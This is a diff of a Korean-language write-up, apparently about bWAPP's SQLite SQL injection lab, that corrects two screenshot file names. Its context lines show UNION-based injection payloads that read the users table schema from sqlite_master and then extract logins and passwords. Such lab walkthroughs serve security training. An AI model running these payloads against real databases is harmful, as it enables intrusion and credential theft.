@@ -51,7 +51,7 @@ author_profile: false
 'and 1=2 union select 1,sql,3,4,5,6 from sqlite_master where tbl_name='users'--
 ```
 
-![그림 1-4](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/imag4.png)
+![그림 1-4](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image4.png)
 
 - 컬럼명을 추출할 수 있다.
 
@@ -59,7 +59,7 @@ author_profile: false
 ' and 1=2 union select 1,id,login,secret,password,6 from users--
 ```
 
-![그림 1-5](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image4.png)
+![그림 1-5](/assets/image/bwapp//injection/sql-lite-archive/sqli-sqlite/image5.png)
 
 - 성공적으로 데이터를 추출할 수 있다.
 
